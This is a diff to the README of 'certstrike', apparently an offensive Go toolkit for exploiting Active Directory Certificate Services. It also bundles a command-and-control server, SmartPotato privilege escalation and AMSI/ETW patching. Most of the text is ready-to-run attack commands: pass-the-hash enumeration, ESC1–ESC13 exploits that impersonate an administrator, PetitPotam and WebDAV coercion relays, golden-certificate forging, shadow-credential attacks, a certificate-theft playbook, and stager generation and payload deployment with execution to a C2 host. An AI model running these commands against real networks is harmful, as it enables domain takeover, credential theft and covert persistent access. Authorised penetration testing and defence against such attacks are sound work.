@@ -6,45 +6,52 @@ ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go
 
 ### ADCS / PKI Exploitation
 - **ESC1-ESC14** complete vulnerability detection, scoring, and exploitation
+- **Real certificate enrollment** via CA web endpoint (/certsrv/) — not just local forging
+- **NTLM pass-the-hash** for both LDAP and HTTP enrollment (`--hash` flag)
 - **ESC1** Misconfigured templates (enrollee supplies subject + auth EKU)
 - **ESC2** Any Purpose EKU templates (enrollee supplies subject)
 - **ESC3** Enrollment Agent templates (two-stage: agent cert → enroll on behalf)
-- **ESC4** Vulnerable template ACLs — full ACE parsing, WriteDACL/WriteOwner exploitation
+- **ESC4** Vulnerable template ACLs — full binary ACE parsing, WriteDACL/WriteOwner, LDAP modify + auto-restore
 - **ESC5** Vulnerable PKI object ACLs on CA
-- **ESC6** EDITF_ATTRIBUTESUBJECTALTNAME2 — arbitrary SAN injection via CA flag
-- **ESC7** Vulnerable CA ACLs — ManageCA rights → enable ESC6 → exploit → restore
-- **ESC8** HTTP web enrollment relay detection (NTLM probing)
-- **ESC9** CT_FLAG_NO_SECURITY_EXTENSION detection and UPN swap exploitation
+- **ESC6** EDITF_ATTRIBUTESUBJECTALTNAME2 — SAN injection via CA enrollment service flags
+- **ESC7** Vulnerable CA ACLs — ManageCA → enable ESC6 → enroll → auto-restore
+- **ESC8** HTTP web enrollment relay detection + PetitPotam auto-coercion
+- **ESC9** CT_FLAG_NO_SECURITY_EXTENSION — UPN swap exploitation with auto-restore
 - **ESC10** Weak certificate mapping detection (CertificateMappingMethods)
 - **ESC11** RPC interface encryption enforcement detection
 - **ESC12** DCOM interface abuse on CA with network HSM key storage
 - **ESC13** OID group link abuse via msDS-OIDToGroupLink
 - **ESC14** Weak explicit mappings via altSecurityIdentities
-- **Golden certificate forging** — sign certs with extracted CA key for persistent domain access
-- **Shadow Credentials** — msDS-KeyCredentialLink attacks for PKINIT without a CA
-- **Attack chain auto-detection** — enumerate, score, prioritize across all ESC paths
-- Native LDAP enumeration (no ldapsearch dependency)
+- **Golden certificate forging** — self-signed or sign with extracted CA key
+- **Shadow Credentials** — msDS-KeyCredentialLink add/list/remove (key persisted before LDAP write)
+- **Auto-pwn** — enumerate → prioritize → exploit → PKINIT commands in one shot
+- **PetitPotam coercion** — MS-EFSRPC via stateful SMB2/DCE/RPC session
+- **WebDAV coercion** — relay from non-admin pivot using custom port >1024
 
 ### C2 Framework
 - HTTP/HTTPS listeners with auto-generated TLS certificates
 - Session management: registration, polling, command queue, result collection
 - **Certificate persistence**: cert-auth implants via forged certificates (Schannel mTLS)
-- **Polling agent**: `certstrike agent --config stager.json`
-- **File delivery**: upload and deploy arbitrary binaries to agents (e.g., Burrow stager)
-- **Deploy command**: `certstrike deploy --session <ID> --file ./payload --path /tmp/svc --execute`
-- Stager and cert-auth implant configuration generation
+- **Polling agent**: cross-platform, mTLS support, signal-aware shutdown
+- **File delivery**: upload and deploy binaries to agents with optional execution
+- Agent command output capped at 10MB (OOM prevention)
 
 ### SmartPotato — Windows Privilege Escalation
-Unified potato toolkit (JuicyPotato, RoguePotato, SweetPotato/PrintSpoofer) with real Windows implementations using `golang.org/x/sys/windows`. Named pipe impersonation, token duplication, AMSI/ETW bypass. Cross-compiles for Windows from Linux.
+- **JuicyPotato** — BITS COM object abuse + named pipe impersonation
+- **SweetPotato** — PrintSpoofer via Print Spooler named pipe trigger
+- **RoguePotato** — DCE/RPC OXID resolver redirect with auto netsh port proxy setup/cleanup
+- AMSI/ETW patching (AmsiScanBuffer + EtwEventWrite)
+- Auto-detect best technique based on running services
 
 ### Operational Tooling
-- **Engagement reporting** — `certstrike pki --report --format markdown`
+- **Engagement reporting** — markdown format with severity tables, attack paths, remediation
 - **JSON output** — `--json` flag for pipeline integration
 - **PFX import/export** — load and inspect PKCS12 files
-- **Stealth mode** — `--stealth` for jittered LDAP queries
-- **LDAPS/StartTLS** — encrypted LDAP connections
-- **MCP server** — 5 tools for agentic integration
-- **TUI operator console** — Bubbletea-based session management
+- **Stealth mode** — jittered LDAP queries, randomized page sizes
+- **LDAPS/StartTLS** — encrypted LDAP connections via `--ldaps` / `--start-tls`
+- **MCP server** — 5 tools for agentic integration (pki_enumerate, pki_forge, c2_*)
+- **TUI operator console** — live C2 session polling, command dispatch, 5 views
+- **Certificate theft playbook** — THEFT1-THEFT5 with certutil/mimikatz/SharpDPAPI commands
 
 ## Quick Start
 
@@ -54,96 +61,193 @@ CGO_ENABLED=0 go build -o certstrike ./cmd/certstrike
 
 # Build SmartPotato for Windows
 cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
+```
 
-# Enumerate all ESC vulnerabilities
-./certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass
+### Enumeration
 
-# JSON output for pipeline integration
-./certstrike pki --enum --json --target-dc dc01.corp.local --domain corp.local -u user -p pass
+```bash
+# Basic enumeration
+certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass
 
-# Exploit ESC1
-./certstrike pki --exploit esc1 --template VulnTemplate --upn admin@corp.local \
+# With LDAPS
+certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --ldaps
+
+# With pass-the-hash (no plaintext password needed)
+certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user --hash aad3b435b51404eeaad3b435b51404ee
+
+# JSON output
+certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --json
+
+# Stealth mode (jittered queries)
+certstrike pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --stealth
+```
+
+### Exploitation
+
+```bash
+# --esc accepts bare numbers (1-14) or esc1-esc14
+
+# ESC1 — misconfigured template
+certstrike pki --esc 1 --template VulnTemplate --upn admin@corp.local \
   --target-dc dc01.corp.local --domain corp.local -u user -p pass
 
-# Exploit ESC2 (Any Purpose EKU)
-./certstrike pki --exploit esc2 --template AnyPurpose --upn admin@corp.local \
+# ESC4 — writable template ACLs (modifies template, exploits as ESC1, restores)
+certstrike pki --esc 4 --template WritableTemplate --upn admin@corp.local \
   --target-dc dc01.corp.local --domain corp.local -u user -p pass
 
-# Exploit ESC3 (Enrollment Agent — two-stage)
-./certstrike pki --exploit esc3 --template EnrollAgent --upn admin@corp.local \
+# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 (SAN injection via request attributes)
+certstrike pki --esc 6 --template AnyTemplate --upn admin@corp.local \
   --target-dc dc01.corp.local --domain corp.local -u user -p pass
 
-# Exploit ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)
-./certstrike pki --exploit esc6 --template AnyTemplate --upn admin@corp.local \
+# ESC7 — ManageCA abuse (enable ESC6 → exploit → restore)
+certstrike pki --esc 7 --ca CorpCA --upn admin@corp.local \
   --target-dc dc01.corp.local --domain corp.local -u user -p pass
 
-# Exploit ESC7 (ManageCA → enable ESC6 → exploit → restore)
-./certstrike pki --exploit esc7 --ca CorpCA --upn admin@corp.local \
-  --target-dc dc01.corp.local --domain corp.local -u user -p pass
+# ESC8 — NTLM relay with auto PetitPotam coercion
+certstrike pki --esc 8 --template Machine --target-dc dc01.corp.local \
+  --domain corp.local -u user -p pass --listener-ip 10.0.0.5
 
-# Exploit ESC9 (UPN swap)
-./certstrike pki --exploit esc9 --template NoSecExt --upn admin@corp.local \
+# ESC8 — relay from non-admin pivot (WebDAV coercion to custom port)
+certstrike pki --esc 8 --template Machine --target-dc dc01.corp.local \
+  --domain corp.local -u user -p pass --listener-ip 10.0.0.5 --listener-port 8080
+
+# ESC9 — UPN swap (modifies attacker UPN, enrolls, restores)
+certstrike pki --esc 9 --template NoSecExt --upn admin@corp.local \
   --attacker-dn "CN=attacker,CN=Users,DC=corp,DC=local" \
   --target-dc dc01.corp.local --domain corp.local -u user -p pass
 
-# Exploit ESC13 (OID group link)
-./certstrike pki --exploit esc13 --template LinkedPolicy --upn admin@corp.local \
+# ESC13 — OID group link abuse
+certstrike pki --esc 13 --template LinkedPolicy --upn admin@corp.local \
   --target-dc dc01.corp.local --domain corp.local -u user -p pass
+```
 
-# Forge golden certificate (with extracted CA key)
-./certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt --output admin.pem
+### Auto-Pwn
 
-# Shadow Credentials
-./certstrike shadow --add --target "CN=victim,CN=Users,DC=corp,DC=local" \
-  --target-dc dc01.corp.local --domain corp.local -u user -p pass
-./certstrike shadow --list --target "CN=victim,CN=Users,DC=corp,DC=local" \
-  --target-dc dc01.corp.local --domain corp.local -u user -p pass
-./certstrike shadow --remove --target "CN=victim,CN=Users,DC=corp,DC=local" --device-id <guid> \
-  --target-dc dc01.corp.local --domain corp.local -u user -p pass
+```bash
+# Full auto: enumerate → exploit highest-scoring path → PKINIT commands
+certstrike auto --target-dc dc01.corp.local --domain corp.local --upn admin@corp.local -u user -p pass
 
-# Generate engagement report
-./certstrike pki --report --format markdown --output findings.md \
-  --target-dc dc01.corp.local --domain corp.local -u user -p pass
+# Dry run: enumerate and plan only, don't exploit
+certstrike auto --dry-run --target-dc dc01.corp.local --domain corp.local --upn admin@corp.local -u user -p pass
+```
 
-# C2 listener
-./certstrike c2 --port 8443 --protocol https
+### Certificate Operations
 
-# C2 polling agent
-./certstrike agent --config stager.json
+```bash
+# Forge golden certificate (with extracted CA key + cert)
+certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt --output admin
 
-# Deploy a file to an active session (e.g., Burrow stager)
-./certstrike deploy --c2-url http://localhost:8443 --session <ID> \
-  --file ./stager-windows-amd64.exe --path 'C:\Windows\Temp\svc.exe' --execute
+# Forge self-signed cert (for testing)
+certstrike pki --forge --upn admin@corp.local --output test
 
 # Import and inspect PFX
-./certstrike pki --import-pfx cert.pfx --pfx-password pass
+certstrike pki --import-pfx cert.pfx
+certstrike pki --import-pfx cert.pfx --json
 
-# Stealth mode with LDAPS
-./certstrike pki --enum --stealth --ldaps --target-dc dc01.corp.local --domain corp.local -u user -p pass
+# Certificate theft playbook (--theft accepts 1-5 or all)
+certstrike pki --theft all
+certstrike pki --theft 4
 
-# Operator console
-./certstrike console
+# Generate engagement report
+certstrike pki --report --format markdown --output findings.md \
+  --target-dc dc01.corp.local --domain corp.local -u user -p pass
+```
 
-# MCP server
-./certstrike mcp
+### Shadow Credentials
+
+```bash
+# Add shadow credential (private key saved to disk before LDAP write)
+certstrike shadow --add --target "CN=victim,CN=Users,DC=corp,DC=local" \
+  --target-dc dc01.corp.local --domain corp.local -u user -p pass
+
+# List shadow credentials
+certstrike shadow --list --target "CN=victim,CN=Users,DC=corp,DC=local" \
+  --target-dc dc01.corp.local --domain corp.local -u user -p pass
+
+# Remove by device ID
+certstrike shadow --remove --target "CN=victim,CN=Users,DC=corp,DC=local" \
+  --device-id <guid> --target-dc dc01.corp.local --domain corp.local -u user -p pass
+```
+
+### C2
+
+```bash
+# Start HTTPS listener
+certstrike c2 --port 8443 --protocol https
+
+# Generate stager config
+certstrike c2 --generate-stager --c2-url https://c2.example.com:8443 --output stager.json
+
+# Generate cert-auth implant (mTLS)
+certstrike c2 --implant-type cert-auth --upn admin@corp.local --c2-url https://c2.example.com:8443
+
+# Run polling agent
+certstrike agent --config stager.json
+
+# Deploy file to active session
+certstrike deploy --c2-url http://localhost:8443 --session <ID> \
+  --file ./stager --path /tmp/svc --execute
+
+# Operator console with live C2 data
+certstrike console --c2-url http://localhost:8080
+
+# MCP server for agentic integration
+certstrike mcp
 ```
 
 ## Architecture
 
 ```
 cmd/certstrike/         CLI entry points (cobra)
-pkg/pki/                ADCS enumeration, ESC1-14 exploitation, certificate forging,
-                        shadow credentials, reporting, PFX handling
-pkg/c2/                 C2 listener, session management, cert-auth implants, polling agent
-internal/mcp/           MCP stdio server (5 tools)
-internal/tui/           Bubbletea operator console
-implants/smartpotato/   Windows potato privilege escalation (build with GOOS=windows)
+  pki.go                PKI enumeration, exploitation, forging, reporting
+  autopwn.go            Auto-pwn orchestration
+  c2.go                 C2 listener, stager/implant generation
+  agent.go              Polling agent
+  deploy.go             File delivery to agents
+  shadow.go             Shadow credentials CLI
+  console.go            TUI operator console
+  mcp_cmd.go            MCP stdio server
+pkg/pki/
+  adcs.go               LDAP enumeration, template scoring, ESC1/ESC4 exploits, cert forging
+  enroll.go             Real certificate enrollment via CA web endpoint (/certsrv/)
+  ntlm.go               NTLMv2 HTTP RoundTripper with pass-the-hash (inline MD4)
+  coerce.go             PetitPotam MS-EFSRPC coercion (stateful SMB2/DCE/RPC)
+  esc2.go - esc14.go    Individual ESC scan + exploit functions
+  esc_relay.go          ESC8/ESC11/ESC12 relay scanning (HTTP probe, RPC flag check, DCOM probe)
+  shadow_credentials.go msDS-KeyCredentialLink operations
+  autopwn.go            Auto-pwn engine (enumerate → prioritize → exploit)
+  report.go             Markdown engagement report generation
+  chain.go              Attack path analysis and prioritization
+  pkinit.go             PKINIT command/script generation
+  unpac.go              UnPAC-the-hash command generation
+  certtheft.go          THEFT1-THEFT5 playbook
+  security_descriptor.go Binary SD/ACE/SID parsing for ESC4/ESC5
+  output.go             EnumerationResult struct, EnumerateAll aggregator
+  pfx.go                PFX import/export
+pkg/c2/
+  listener.go           HTTP/HTTPS C2 listener with session management
+  agent.go              Polling agent with mTLS, file delivery, output limits
+  deploy.go             File delivery endpoints
+  certauth.go           Cert-auth implant generation
+internal/mcp/
+  server.go             MCP JSON-RPC stdio server (5 tools)
+internal/tui/
+  app.go                Bubbletea operator console with live C2 polling
+implants/smartpotato/
+  potato_windows.go     JuicyPotato, SweetPotato, RoguePotato (Windows)
+  potato_other.go       Stub for non-Windows builds
 ```
 
 ## Dependencies
-All pure Go, CGO_ENABLED=0 compatible:
-- `github.com/spf13/cobra` — CLI framework
-- `github.com/go-ldap/ldap/v3` — Native LDAP client
-- `github.com/charmbracelet/bubbletea` — TUI framework
-- `github.com/charmbracelet/lipgloss` — TUI styling
-- `software.sslmate.com/src/go-pkcs12` — PKCS12/PFX handling
+
+All pure Go, `CGO_ENABLED=0` compatible:
+
+| Package | Purpose |
+|---------|---------|
+| `github.com/spf13/cobra` | CLI framework |
+| `github.com/go-ldap/ldap/v3` | Native LDAP client |
+| `github.com/charmbracelet/bubbletea` | TUI framework |
+| `github.com/charmbracelet/lipgloss` | TUI styling |
+| `software.sslmate.com/src/go-pkcs12` | PKCS12/PFX handling |
+
+NTLM authentication uses a built-in NTLMv2 implementation with inline MD4 — no external crypto dependencies.
